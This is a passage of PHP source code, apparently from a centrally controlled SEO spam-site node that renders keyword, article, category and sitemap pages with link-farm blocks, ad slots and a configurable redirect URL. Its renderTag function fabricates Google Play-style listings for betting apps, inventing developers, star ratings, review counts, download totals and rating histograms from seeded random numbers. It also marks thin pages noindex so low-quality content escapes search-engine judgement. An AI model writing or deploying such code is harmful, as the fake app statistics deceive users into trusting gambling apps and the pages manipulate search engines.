            if (self::canonPath($node, $canon) !== $path) { return self::redirect($canon); }
        }
        return self::renderDetail($node, $tpl, $base, $seq);
    }
    // 分类列表
    if (($p = self::matchUrl($node, 'cat', $path)) !== null) {
        $pg = isset($p['page']) ? (int)$p['page'] : 1;
        $canon = $node->url('cat', array('slug' => $p['slug'], 'page' => $pg));
        if (self::canonPath($node, $canon) !== $path) { return self::redirect($canon); }
        return self::renderCat($node, $tpl, $base, $p['slug'], $pg);
    }
    // 关键词列表
    if (($p = self::matchUrl($node, 'kwlist', $path)) !== null) {
        $pg = isset($p['page']) ? (int)$p['page'] : 1;
        $canon = $node->url('kwlist', array('page' => $pg));
        if (self::canonPath($node, $canon) !== $path) { return self::redirect($canon); }
        return self::renderKwList($node, $tpl, $base, $pg);
    }

    return self::render404($node, $tpl, $base);
    }

    /** 用站点 URL 规则匹配路径，命中返回参数数组 */
    /**
     * 用 URL 规则匹配路径。除了当前规则，也试上一版规则——改规则时老地址才不会直接死。
     * 命中老规则会带上 _prev=1，路由层据此 301 到新地址。
     *
     * 日期占位符按通配匹配、**不校验具体日期**：校验的话任何一个老日期的链接都会 404。
     * 日期不对的会在路由层被 301 收敛到规范地址，所以也不会产生重复内容。
     */
    public static function matchUrl(Node $node, $type, $path)
    {
        foreach (array('', '_prev') as $suffix) {
            $pattern = $node->s('url_' . $type . $suffix, '');
            if ($pattern === '') { continue; }
            foreach (array($pattern, Node::pagelessPattern($pattern)) as $pat) {
                $re = '~^' . str_replace(
                    array('\{id\}', '\{code\}', '\{page\}', '\{slug\}', '\{y\}', '\{m\}', '\{d\}'),
                    array('(?P<id>\d+)', '(?P<code>[0-9a-z]{10})', '(?P<page>\d+)', '(?P<slug>[^/]+)',
                          '\d{4}', '\d{2}', '\d{2}'),
                    preg_quote($pat, '~')) . '$~u';
                if (preg_match($re, $path, $m)) {
                    $out = array();
                    foreach ($m as $k => $v) { if (!is_int($k)) { $out[$k] = $v; } }
                    if ($suffix !== '') { $out['_prev'] = 1; }
                    return $out;
                }
                if ($pat === $pattern && strpos($pattern, '{page}') === false) { break; }
            }
        }
        return null;
    }

    /** 剥掉 basePath 前缀, 把 url() 产物还原成路由形态用于比较 */
    public static function canonPath(Node $node, $url)
    {
        $bp = $node->basePath;
        if ($node->envMode === 'query') { $bp .= '?'; }
        if ($bp !== '' && strpos($url, $bp) === 0) { $url = substr($url, strlen($bp)); }
        if ($url !== '' && $url[0] !== '/') { $url = '/' . $url; }
        return $url === '' ? '/' : $url;
    }

    /** 301 到规范地址 */
    public static function redirect($to)
    {
        return array('body' => '', 'type' => 'text/html; charset=utf-8',
                     'status' => 301, 'cacheable' => false, 'location' => $to);
    }

    public static function baseVars(Node $node)
    {
    $site  = $node->site();
    $links = $node->res('links');
    return array(
        'site' => array(
            'name'      => isset($site['name']) ? $site['name'] : '',
            'domain'    => isset($site['domain']) ? $site['domain'] : '',
            'url'       => $node->base(),
            'icp'       => $node->s('icp', ''),
            'analytics' => $node->s('analytics', ''),
            'money'     => $node->s('money_url', ''),   // 跳转网址(面板站点设置可改)
            'vars'      => isset($site['vars']) ? $site['vars'] : array(),
        ),
        'var'  => isset($site['vars']) ? $site['vars'] : array(),
        'nav'  => isset($links['nav']) ? $links['nav'] : array(),
        'links'=> isset($links['link']) ? $links['link'] : array(),
        'cats' => self::catViews($node),
        'now'  => array('y' => date('Y'), 'm' => date('m'), 'd' => date('d'), 'date' => date('Y-m-d')),
        'urls' => array(
            'home'   => '/',
            'kwlist' => $node->url('kwlist', array('page' => 1)),
        ),
    );
    }
    /**
     * 生成本页 TDK。$seed 是字符串种子（不是随机流）——
     * TDK 只由「站点密钥 + 页面身份 + 规则文本」决定，
     * 与文章数量、内链、广告、数据版本号全部无关，所以推送新版本不会改标题描述。
     */
    public static function seo(Node $node, $scene, array $vars, $seed, array $fallback)
    {
    return array(
        'title'       => $node->rule($scene, 'title', $vars, $seed, $fallback['title'])
                       . (string)$node->s('title_suffix', ''),
        'keywords'    => $node->rule($scene, 'keywords', $vars, $seed, $fallback['keywords']),
        'description' => $node->rule($scene, 'desc', $vars, $seed, $fallback['desc']),
        'h1'          => $node->rule($scene, 'h1', $vars, $seed, $fallback['h1']),
        'noindex'     => (int)$node->s('noindex', 0),
    );
    }
    /** 每页的三条随机流：TDK 用字符串种子，这三条允许随版本变化 */
    public static function streams(Node $node, $seed)
    {
    return array(
        'body' => new Prng($seed . '|body'),
        'link' => new Prng($seed . '|link|v' . $node->ver),
        'ad'   => new Prng($seed . '|ad|v' . $node->ver),
    );
    }
    public static function renderIndex(Node $node, Tpl $tpl, array $base)
    {
    $seed = $node->cfg['node_key'] . '|index';      // 固定种子：首页 TDK 永不变
    $st   = self::streams($node, $seed);
    $site = $node->site();
    $name = isset($site['name']) ? $site['name'] : '';

    $page = self::seo($node, 'index', array('kw' => $name), $seed, array(
        'title' => '{site}', 'keywords' => '{site}', 'desc' => '{site}', 'h1' => '{site}',
    ));
    $page['canonical'] = $node->base() . '/';
    $page['type']      = 'index';

    $hotN = max(1, (int)$node->s('index_kw', 30));
    $kwTotal = $node->count('keywords');
    $hot = array();
    foreach ($st['link']->uniq($hotN, $kwTotal) as $s) {
        $kw = $node->keyword($s);
        if ($kw) { $hot[] = $node->kwView($kw); }
    }

    $vars = $base + array(
        'page'  => $page,
        'hot'   => $hot,
        'arts'  => $node->articleRange(0, max(1, (int)$node->s('index_art', 10))),
        'peers' => $node->peerLinks($st['link'], $node->linkOrd('index')),
        'ads'   => $node->adSlots($st['ad']),
        'crumb' => array(),
        'stats' => array('kw' => $kwTotal, 'art' => $node->count('articles')),
    );
    return self::resp($tpl->render('index', $vars));
    }
    public static function renderTag(Node $node, Tpl $tpl, array $base, $seq, $canonUrl = '', $selfPath = '')
    {
    $kw = $node->keyword($seq);
    if (!$kw) { return self::render404($node, $tpl, $base); }

    $word = $kw['w'];
    // 种子用关键词文本而不是序号：即使词库中间增删导致序号平移，
    // 同一个词的标题描述依然是原来那一套。
    $seed = $node->cfg['node_key'] . '|kw|' . $word;
    $st   = self::streams($node, $seed);

    // Google Play 商店变量（稳定种子，同词同值）
    $ap = new Prng($seed . '|app');
    $devs = array('Bet9ja Tech', 'Sporty Studios', 'Naija Games', 'Lagos Apps', 'Naija Dev', 'Arena Gaming', 'Pulse Games');
    $acats = array('Sports', 'Casino', 'Card', 'Board', 'Entertainment', 'Strategy', 'Racing');
    $adls = array('50K+', '100K+', '500K+', '1M+', '5M+', '10M+', '50M+');
    $aages = array('18+', '18+', '18+', '16+', '12+');
    $aand  = array('5.0 and up', '6.0 and up', '7.0 and up', '8.0 and up', '9 and up');
    $rate10 = $ap->int(40, 49);   // 4.0–4.9
    $revs = $ap->int(500, 800000);
    if ($revs >= 1000000) { $revShort = rtrim(rtrim(number_format($revs / 1000000, 1), '0'), '.') . 'M'; }
    elseif ($revs >= 1000) { $revShort = round($revs / 1000) . 'K'; }
    else { $revShort = (string)$revs; }
    $app = array(
        'developer' => $devs[$ap->int(0, count($devs) - 1)],
        'initial'   => mb_strtoupper(mb_substr($word, 0, 1)),
        'icon'      => isset($kw['e']['icon']) ? (string)$kw['e']['icon'] : '',
        'icon_bg'   => sprintf('#%06x', $ap->int(0, 0xFFFFFF)),
        'icon_bg2'  => sprintf('#%06x', $ap->int(0, 0xFFFFFF)),
        'rating'    => number_format($rate10 / 10, 1),
        'rating_raw'=> $rate10 / 10,
        'rating_pct'=> $rate10 * 2,
        'reviews'   => number_format($revs),
        'reviews_raw'=> $revs,
        'reviews_short'=> $revShort,
        'downloads' => $adls[$ap->int(0, count($adls) - 1)],
        'size'      => ($ap->int(8, 150)) . ' MB',
        'version'   => $ap->int(1, 9) . '.' . $ap->int(0, 9) . '.' . $ap->int(0, 9),
        'updated'   => date('M d, Y', time() - $ap->int(2, 200) * 86400),
        'released'  => date('M d, Y', time() - $ap->int(300, 2500) * 86400),
        'android'   => $aand[$ap->int(0, count($aand) - 1)],
        'category'  => $acats[$ap->int(0, count($acats) - 1)],
        'age'       => $aages[$ap->int(0, count($aages) - 1)],
        'hist'      => array(
            '5' => $ap->int(45, 75),
            '4' => $ap->int(18, 34),
            '3' => $ap->int(8, 16),
            '2' => $ap->int(2, 8),
            '1' => $ap->int(1, 5),
        ),
    );

    $page = self::seo($node, 'tag', array('kw' => $word), $seed, array(
        'title' => '{kw}_{site}', 'keywords' => '{kw}',
        'desc'  => '{kw}相关内容，由{site}整理。', 'h1' => '{kw}',
    ));
    $page['canonical'] = $canonUrl !== '' ? $canonUrl
                       : $node->base() . $node->url('kw', array('id' => $seq, 'ts' => $node->pageTs($seq)));
    $page['type']      = 'tag';
    // og:image 优先用真实 app 图标外链（extra.icon），没有才回退本地静态卡片
    $page['og_image']  = !empty($kw['e']['icon'])
                       ? (string)$kw['e']['icon']
                       : $node->s('og_img_base', 'https://ng.aij99.xyz/static/og/') . $seq . '.png';

    $body = $node->buildBody($word, $st['body'], $seed);

    // 薄内容不送审：正文太短就 noindex，避免大量低质页面被判定
    $minLen = (int)$node->s('min_body_len', 300);
    if ($minLen > 0 && mb_strlen(trim(strip_tags($body['html']))) < $minLen) {
        $page['noindex'] = 1;
    }

    $prev = $node->keyword($seq - 1);
    $next = $node->keyword($seq + 1);

    $vars = $base + array(
        'page'    => $page,
        'app'     => $app,
        'kw'      => $node->kwView($kw),
        'body'    => $body['html'],
        'blocks'  => $body['blocks'],
        'related' => array_merge($node->relatedKeywords($seq, $st['link']),
            $node->breedLinks($selfPath !== '' ? $selfPath
                : $node->url('kw', array('id' => $seq, 'ts' => $node->pageTs($seq))))),
        'peers'   => $node->peerLinks($st['link'], $node->linkOrd('kw', $seq)),
        'ads'     => $node->adSlots($st['ad']),
        'crumb'   => array(
            array('name' => '首页', 'url' => '/'),
            array('name' => '全部内容', 'url' => $node->url('kwlist', array('page' => 1))),
            array('name' => $word, 'url' => ''),
        ),
        'prev'    => $prev ? $node->kwView($prev) : null,
        'next'    => $next ? $node->kwView($next) : null,
    );
    return self::resp($tpl->render('tag', $vars));
    }
    public static function renderDetail(Node $node, Tpl $tpl, array $base, $seq, $canonUrl = '', $selfPath = '')
    {
    $a = $node->article($seq);
    if (!$a) { return self::render404($node, $tpl, $base); }

    $seed = $node->cfg['node_key'] . '|art|' . $a['t'];
    $st   = self::streams($node, $seed);

    $page = self::seo($node, 'detail', array('kw' => $a['t'], 'title' => $a['t']), $seed, array(
        'title' => '{title}_{site}', 'keywords' => '{title}',
        'desc'  => '{title}', 'h1' => '{title}',
    ));
    $page['canonical'] = $canonUrl !== '' ? $canonUrl
                       : $node->base() . $node->url('art', array('id' => $seq,
                           'ts' => $node->pageTs($seq, isset($a['d']) ? (int)$a['d'] : 0)));
    $page['type']      = 'detail';

    $prevA = $node->article($seq - 1);
    $nextA = $node->article($seq + 1);
    $art   = $node->artView($a, true);

    $vars = $base + array(
        'page'    => $page,
        'art'     => $art,
        'related' => array_merge($node->relatedKeywords($seq, $st['link'], 10),
            $node->breedLinks($selfPath !== '' ? $selfPath
                : $node->url('art', array('id' => $seq,
                    'ts' => $node->pageTs($seq, isset($a['d']) ? (int)$a['d'] : 0))))),
        'peers'   => $node->peerLinks($st['link'], $node->linkOrd('art', $seq)),
        'ads'     => $node->adSlots($st['ad']),
        'crumb'   => array(
            array('name' => '首页', 'url' => '/'),
            array('name' => $art['title'], 'url' => ''),
        ),
        'prev'    => $prevA ? $node->artView($prevA, false) : null,
        'next'    => $nextA ? $node->artView($nextA, false) : null,
    );
    return self::resp($tpl->render('detail', $vars));
    }
    public static function renderCat(Node $node, Tpl $tpl, array $base, $slug, $page)
    {
    $cat = null;
    foreach ($node->res('categories') as $c) {
        if ($c['slug'] === $slug) { $cat = $c; break; }
    }
    if (!$cat) { return self::render404($node, $tpl, $base); }

    $per   = max(1, (int)$node->s('art_per_page', 20));
    $pages = max(1, (int)ceil($cat['count'] / $per));
    $page  = max(1, min($pages, (int)$page));

    $seed = $node->cfg['node_key'] . '|cat|' . $slug . '|' . $page;
    $st   = self::streams($node, $seed);

    $meta = self::seo($node, 'list', array('kw' => $cat['name'], 'cat' => $cat['name']), $seed, array(
        'title' => '{cat}_{site}', 'keywords' => '{cat}',
        'desc'  => '{cat}栏目内容列表', 'h1' => '{cat}',
    ));
    if ($page > 1) { $meta['title'] = $meta['title'] . ' 第' . $page . '页'; }
    $meta['canonical'] = $node->base() . $node->url('cat', array('slug' => $slug, 'page' => $page));
    $meta['type']      = 'list';

    $vars = $base + array(
        'page'  => $meta,
        'cat'   => $cat,
        'items' => $node->articlesOfCat($slug, ($page - 1) * $per, $per),
        'pager' => self::pager($node, 'cat', $page, $pages, array('slug' => $slug)),
        'peers' => $node->peerLinks($st['link'], $node->linkOrd('cat', $slug, $page)),
        'ads'   => $node->adSlots($st['ad']),
        'crumb' => array(
            array('name' => '首页', 'url' => '/'),
            array('name' => $cat['name'], 'url' => ''),
        ),
    );
    return self::resp($tpl->render('list', $vars));
    }
    public static function renderKwList(Node $node, Tpl $tpl, array $base, $page)
    {
    $total = $node->count('keywords');
    $per   = max(1, (int)$node->s('kw_per_page', 40));
    $pages = max(1, (int)ceil($total / $per));
    $page  = max(1, min($pages, (int)$page));

    $seed = $node->cfg['node_key'] . '|list|' . $page;
    $st   = self::streams($node, $seed);

    $meta = self::seo($node, 'list', array('kw' => '全部'), $seed, array(
        'title' => '全部内容_{site}', 'keywords' => '{site}',
        'desc'  => '{site}全部内容索引', 'h1' => '全部内容',
    ));
    if ($page > 1) { $meta['title'] .= ' 第' . $page . '页'; }
    $meta['canonical'] = $node->base() . $node->url('kwlist', array('page' => $page));
    $meta['type']      = 'list';

    $vars = $base + array(
        'page'  => $meta,
        'items' => $node->keywordRange(($page - 1) * $per, $per),
        'pager' => self::pager($node, 'kwlist', $page, $pages),
        'peers' => $node->peerLinks($st['link'], $node->linkOrd('list', 0, $page)),
        'ads'   => $node->adSlots($st['ad']),
        'crumb' => array(
            array('name' => '首页', 'url' => '/'),
            array('name' => '全部内容', 'url' => ''),
        ),
    );
    return self::resp($tpl->render('list', $vars));
    }
    public static function render404(Node $node, Tpl $tpl, array $base)
    {
    $vars = $base + array(
        'page'  => array('title' => '404 Not Found', 'h1' => '404', 'description' => '',
                         'keywords' => '', 'noindex' => 1, 'type' => '404'),
        'crumb' => array(array('name' => '首页', 'url' => '/')),
        'peers' => array(),
        'ads'   => array(),
    );
    $body = $tpl->has('404') ? $tpl->render('404', $vars) : '<!doctype html><meta charset="utf-8"><h1>404</h1>';
    return self::resp($body, 'text/html; charset=utf-8', 404, false);
    }
    public static function catViews(Node $node)
    {
    $out = array();
    foreach ($node->res('categories') as $c) {
        $out[] = array(
            'name'  => $c['name'],
            'slug'  => $c['slug'],
            'count' => $c['count'],
            'url'   => $node->url('cat', array('slug' => $c['slug'], 'page' => 1)),
        );
    }
    return $out;
    }
    public static function pager(Node $node, $type, $cur, $pages, array $extra = array())
    {
    $mk = function ($p) use ($node, $type, $extra) {
        return $node->url($type, $extra + array('page' => $p));
    };
    $list = array();
    $from = max(1, $cur - 4);
    $to   = min($pages, $from + 8);
    for ($i = $from; $i <= $to; $i++) {
        $list[] = array('n' => $i, 'url' => $mk($i), 'cur' => $i === $cur);
    }
    return array(
        'cur' => $cur, 'pages' => $pages, 'list' => $list,
        'prev' => $cur > 1 ? $mk($cur - 1) : '',
        'next' => $cur < $pages ? $mk($cur + 1) : '',
        'first' => $mk(1), 'last' => $mk($pages),
    );
    }
    public static function sitemap(Node $node, $kind, $no)
    {
    $base = $node->base();
    $size = max(100, (int)$node->s('sitemap_size', 1000));
    $xml  = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";

    if ($kind === '') {
        $kwPages  = (int)ceil($node->count('keywords') / $size);
        $artPages = (int)ceil($node->count('articles') / $size);
        $xml .= '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
        for ($i = 1; $i <= $kwPages; $i++)  { $xml .= '<sitemap><loc>' . $base . $node->pubUrl('/sitemap-k-' . $i . '.xml') . '</loc></sitemap>'; }
        for ($i = 1; $i <= $artPages; $i++) { $xml .= '<sitemap><loc>' . $base . $node->pubUrl('/sitemap-a-' . $i . '.xml') . '</loc></sitemap>'; }
        $xml .= '</sitemapindex>';
        return self::resp($xml, 'application/xml; charset=utf-8');
    }

    $no    = max(1, $no);
    $start = ($no - 1) * $size;
    $total = $node->count($kind === 'k' ? 'keywords' : 'articles');
    $type  = $kind === 'k' ? 'kw' : 'art';
    $today = date('Y-m-d');

    $xml .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">';
    for ($i = $start; $i < min($start + $size, $total); $i++) {
        // 序号有空洞（删过的条目），跳过，别把 404 写进 sitemap
        $exists = ($kind === 'k') ? $node->keyword($i) : $node->article($i);
        if (!$exists) { continue; }
        $ts = ($kind === 'k') ? $node->pageTs($i)
                             : $node->pageTs($i, isset($exists['d']) ? (int)$exists['d'] : 0);
        $loc = $base . $node->url($type, array('id' => $i, 'ts' => $ts));
        $mod = date('Y-m-d', $ts > 0 ? $ts : time());
        $xml .= '<url><loc>' . htmlspecialchars($loc, ENT_QUOTES)
              . '</loc><lastmod>' . $mod . '</lastmod><changefreq>weekly</changefreq></url>';
    }
    $xml .= '</urlset>';
    return self::resp($xml, 'application/xml; charset=utf-8');
    }
    public static function resp($body, $type = 'text/html; charset=utf-8', $status = 200, $cacheable = true)
    {
    return array('body' => $body, 'type' => $type, 'status' => $status, 'cacheable' => $cacheable);
    }
    public static function contentType($path)
    {
    if (substr($path, -4) === '.xml') { return 'application/xml; charset=utf-8'; }
    if (substr($path, -4) === '.txt') { return 'text/plain; charset=utf-8'; }
    return 'text/html; charset=utf-8';
    }
    /** 处理 If-Modified-Since */
    public static function notModified($mtime)
    {
    if (empty($_SERVER['HTTP_IF_MODIFIED_SINCE'])) { return false; }
    $since = strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE']);
    return $since !== false && $since >= $mtime;
    }

    /**
     * ETag 取正文哈希，不取文件时间。
     * 为什么不能只靠 Last-Modified：推一次新版本会把缓存/静态文件重烤一遍，
     * 文件时间必然前移，可 TDK 和正文按设计是一个字节都没变的——只靠时间的话
     * 蜘蛛每次推送后都要把整站重新下载一遍，白烧抓取预算。按内容算就不会。
     */
    public static function etag($body)
    {
    return '"' . md5((string)$body) . '"';
    }

    /** 处理 If-None-Match。按 RFC 7232，它在场时优先级高于 If-Modified-Since */
    public static function etagMatch($etag)
    {
    if (empty($_SERVER['HTTP_IF_NONE_MATCH'])) { return false; }
    foreach (explode(',', $_SERVER['HTTP_IF_NONE_MATCH']) as $one) {
        $one = trim($one);
        if ($one === '*') { return true; }
        if (strncmp($one, 'W/', 2) === 0) { $one = substr($one, 2); }   // 反代可能弱化成 W/"..."
        if ($one === $etag) { return true; }
    }
    return false;
    }

    /** 条件请求总入口：命中就该回 304 */
    public static function conditional($etag, $mtime)
    {
    if (!empty($_SERVER['HTTP_IF_NONE_MATCH'])) { return self::etagMatch($etag); }
    return $mtime > 0 && self::notModified($mtime);
    }


    /** 主控模板 + 内置兜底 */
    public static function templates(Node $node)
    {
    $t = $node->res('templates');
    $builtin = self::builtinTemplates();
    foreach ($builtin as $k => $v) {
        if (!isset($t[$k]) || trim((string)$t[$k]) === '') { $t[$k] = $v; }
    }
    return $t;
    }
    public static function builtinTemplates()
    {
    $head = '<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">'
          . '<meta name="viewport" content="width=device-width,initial-scale=1">'
          . '<title>{$page.title}</title>'
          . '<meta name="keywords" content="{$page.keywords}">'
          . '<meta name="description" content="{$page.description}">'
          . '{if $page.canonical}<link rel="canonical" href="{$page.canonical}">{/if}'
          . '{if $page.noindex}<meta name="robots" content="noindex,nofollow">{/if}'
          . '<style>body{font:16px/1.8 system-ui,-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;margin:0;color:#222;background:#fafafa}'
          . '.wrap{max-width:900px;margin:0 auto;padding:0 16px}header{background:#fff;border-bottom:1px solid #eee;padding:14px 0}'
          . 'header a{margin-right:14px;color:#333;text-decoration:none}h1{font-size:24px;margin:24px 0 12px}h2{font-size:19px;margin:26px 0 10px}'
          . 'main{background:#fff;padding:20px;border:1px solid #eee;border-radius:6px;margin:16px 0}'
          . '.tags a{display:inline-block;margin:0 8px 8px 0;padding:4px 10px;background:#f2f4f7;border-radius:4px;color:#2a5db0;text-decoration:none;font-size:14px}'
          . 'ul.list{list-style:none;padding:0}ul.list li{padding:8px 0;border-bottom:1px dashed #eee}'
          . '.pager a{display:inline-block;padding:4px 10px;margin-right:6px;border:1px solid #ddd;border-radius:4px;color:#333;text-decoration:none}'
          . '.pager .cur{background:#2a5db0;color:#fff;border-color:#2a5db0}'
          . 'footer{color:#888;font-size:13px;padding:20px 0;text-align:center}</style></head><body>'
          . '<header><div class="wrap"><strong>{$site.name}</strong> '
          . '<a href="/">首页</a>{foreach $nav as $n}<a href="{$n.u}">{$n.n}</a>{/foreach}</div></header><div class="wrap">';

    $foot = '</div><footer><div class="wrap">{foreach $links as $l}<a href="{$l.u}" rel="nofollow">{$l.n}</a> {/foreach}'
          . '<div>{$site.name} {$site.icp}</div></footer>{$site.analytics|raw}</body></html>';

    return array(
        'header' => $head,
        'footer' => $foot,
        'index'  => '{include header}<main><h1>{$page.h1}</h1>'
                  . '<div class="tags">{foreach $hot as $k}<a href="{$k.url}">{$k.word}</a>{/foreach}</div>'
                  . '<h2>最新内容</h2><ul class="list">{foreach $arts as $a}<li><a href="{$a.url}">{$a.title}</a></li>{/foreach}</ul>'
                  . '<p><a href="{$urls.kwlist}">查看全部 {$stats.kw} 个词条 →</a></p></main>{include footer}',
        'tag'    => '{include header}<main><h1>{$page.h1}</h1>{$body|raw}'
                  . '<h2>相关内容</h2><div class="tags">{foreach $related as $k}<a href="{$k.url}">{$k.word}</a>{/foreach}</div>'
                  . '<p>{if $prev}<a href="{$prev.url}">← {$prev.word}</a>{/if} {if $next}<a href="{$next.url}">{$next.word} →</a>{/if}</p>'
                  . '</main>{include footer}',
        'list'   => '{include header}<main><h1>{$page.h1}</h1><ul class="list">'
                  . '{foreach $items as $it}<li><a href="{$it.url}">{if $it.word}{$it.word}{else}{$it.title}{/if}</a></li>{/foreach}</ul>'
                  . '<div class="pager">{foreach $pager.list as $p}<a href="{$p.url}" class="{if $p.cur}cur{/if}">{$p.n}</a>{/foreach}</div>'
                  . '</main>{include footer}',
        'detail' => '{include header}<main><h1>{$page.h1}</h1><article>{$art.content|raw}</article>'
                  . '<h2>相关</h2><div class="tags">{foreach $related as $k}<a href="{$k.url}">{$k.word}</a>{/foreach}</div>'
                  . '</main>{include footer}',
        '404'    => '{include header}<main><h1>404 Not Found</h1><p><a href="/">Home</a></p></main>{include footer}',
    );
    }
}


function deployDomain(array $cfg)
{
    $host = isset($_SERVER['HTTP_HOST']) ? strtolower((string)$_SERVER['HTTP_HOST']) : '';
    if ($host === '') { return isset($cfg['domain']) ? (string)$cfg['domain'] : ''; }
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
          || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');
    $dir = rtrim(str_replace('\\', '/', dirname(isset($_SERVER['SCRIPT_NAME']) ? (string)$_SERVER['SCRIPT_NAME'] : '')), '/');
    if ($dir === '.' || $dir === '/') { $dir = ''; }
    return ($https ? 'https' : 'http') . '://' . $host . $dir;
}

// ==================================================== 环境探测
// 节点上线后自己回答三个问题: 跑在什么服务器上? 伪静态能不能用?
// 链接该生成什么形态? 结果缓存 data/env.json, 随 stat 应答回传主控标注。
function envDetect(Node $node, $force = false)
{
    static $busy = false;
    if ($busy) { return $node->envLoad(); }
    $env = $node->envLoad();
    if (!$force && !empty($env['at']) && time() - (int)$env['at'] < 21600) { return $env; }
    if (PHP_SAPI === 'cli') { return $env; }   // CLI 没有 web 上下文

    if (!empty($node->cfg['base_path'])) {
        $e = array('at'=>time(),'mode'=>'clean','base_path'=>$node->cfg['base_path'],
                   'server'=>isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'');
        $node->envSave($e); return $e;
    }
    $busy = true;
    // 先落占位: 自探请求自己也会进 afterOutput→envDetect, 没占位会无限递归
    $node->envSave(array('at' => time(), 'detecting' => 1));

    $sn  = isset($_SERVER['SCRIPT_NAME']) ? (string)$_SERVER['SCRIPT_NAME'] : '';
    $sgDr = str_replace('\\','/',(string)(isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:''));
    $sgFp = str_replace('\\','/',__FILE__);
    if ($sgDr !== '' && strpos($sgFp, $sgDr) === 0) { $sn = substr($sgFp, strlen($sgDr)); }
    $dir = rtrim(str_replace('\\', '/', dirname($sn)), '/');
    $dir = ($dir === '' || $dir === '.') ? '' : $dir;
    $script = basename($sn);
    $sw = isset($_SERVER['SERVER_SOFTWARE']) ? (string)$_SERVER['SERVER_SOFTWARE'] : '';
    $server = 'other';
    if (stripos($sw, 'apache') !== false) { $server = 'apache'; }
    elseif (stripos($sw, 'litespeed') !== false || stripos($sw, 'lsws') !== false) { $server = 'litespeed'; }
    elseif (stripos($sw, 'nginx') !== false) { $server = 'nginx'; }
    elseif (stripos($sw, 'microsoft-iis') !== false) { $server = 'iis'; }
    elseif (stripos($sw, 'caddy') !== false) { $server = 'caddy'; }

    $env = array(
        'server'    => $server,
        'server_raw'=> substr($sw, 0, 60),
        'php'       => PHP_VERSION,
        'sapi'      => PHP_SAPI,
        'dir'       => $dir,
        'script'    => $script,
        'writable'  => is_writable(dirname(__FILE__)) ? 1 : 0,
        'htaccess'  => 'none',
        'rewrite'   => 'na',
        'mode'      => 'pathinfo',
        'base_path' => $dir . '/' . $script,
        'at'        => time(),
    );

    // Apache 系(LiteSpeed 兼容 .htaccess): 自动落伪静态规则 + 自检验证
    if ($server === 'apache' || $server === 'litespeed') {
        $ht = dirname(__FILE__) . '/.htaccess';
        $canWrite = false;
        if (is_file($ht)) {
            $old = (string)@file_get_contents($ht);
            $canWrite = strpos($old, '# auto') !== false;   // 只覆盖自己生成的
            $env['htaccess'] = $canWrite ? 'ours' : 'foreign';
        } else {
            $canWrite = true;
        }
        if ($canWrite) {
            $rb = $dir === '' ? '/' : $dir . '/';
            $rule = "# auto\n"
                  . "DirectoryIndex " . $script . "\n"
                  . "<IfModule mod_rewrite.c>\n"
                  . "RewriteEngine On\n"
                  . "RewriteBase " . $rb . "\n"
                  . "RewriteCond %{REQUEST_FILENAME} !-f\n"
                  . "RewriteCond %{REQUEST_FILENAME} !-d\n"
                  . "RewriteRule ^(.*)$ " . $script . "/$1 [L,QSA]\n"
                  . "</IfModule>\n";
            if (@file_put_contents($ht, $rule) !== false) {
                $env['htaccess'] = is_file($ht) && $env['htaccess'] === 'ours' ? 'ours' : 'written';
            }
        }
        if ($env['htaccess'] !== 'none' && $env['htaccess'] !== 'foreign') {
            $env['rewrite'] = envProbe($dir . '/_sgprobe') ? 'ok' : 'fail';
        } elseif ($env['htaccess'] === 'foreign') {
            // 目录里已有别人的规则, 不碰, 但也试试干净 URL 通不通
            $env['rewrite'] = envProbe($dir . '/_sgprobe') ? 'ok' : 'fail';
        }
        if ($env['rewrite'] === 'ok') {
            $env['mode'] = 'clean';
            $env['base_path'] = $dir;
        }
    }

    // PATH_INFO 兜底自检: 连 /脚本/路径 都打不通就要面板标注"需手工配置"了
    if ($env['mode'] !== 'clean') {
        $pi = envProbe($dir . '/' . $script . '/_sgprobe');
        $env['pathinfo'] = $pi ? 'ok' : 'fail';
        // 伪静态和 PATH_INFO 都打不通也不判死刑: 转查询串形态(/目录?路径), 一定能跑
        if (!$pi) { $env['mode'] = 'query'; $env['base_path'] = $dir; }
    }

    if (!empty($node->cfg['base_path'])) { $env['mode'] = 'clean'; $env['base_path'] = $node->cfg['base_path']; }
    $node->envSave($env);
    $busy = false;
    return $env;
}

/** 自探: 小超时请求自己的地址, 看响应里有没有 _sgprobe 路由的标记 */
function envProbe($path)
{
    $host = isset($_SERVER["HTTP_HOST"]) ? (string)$_SERVER["HTTP_HOST"] : "";
    if ($host === "" || $path === "") { return false; }
    $https = (!empty($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] !== "off")
          || (isset($_SERVER["SERVER_PORT"]) && (int)$_SERVER["SERVER_PORT"] === 443)
          || (isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && $_SERVER["HTTP_X_FORWARDED_PROTO"] === "https");
    // 先试公网地址; 不通再试本机回环(NAT 回环/端口映射场景公网地址打不通自己)。
    // 回环只试 80/443: SERVER_PORT 在 Apache 下取自 Host 头(UseCanonicalName Off), 不可信。
    $tries = array(
        array(($https ? "https" : "http") . "://" . $host . $path, ""),
        array("http://127.0.0.1" . $path, $host),
        array("https://127.0.0.1" . $path, $host),
    );
    foreach ($tries as $t) {
        $body = envHttpGet($t[0], $t[1]);
        if (is_string($body) && strpos($body, "SGPROBE_OK") !== false) { return true; }
    }
    return false;
}

function envHttpGet($url, $hostHeader)
{
    if (function_exists("curl_init")) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 4);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);   // 自探, 证书有效性无所谓
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, "sgnode-envprobe");
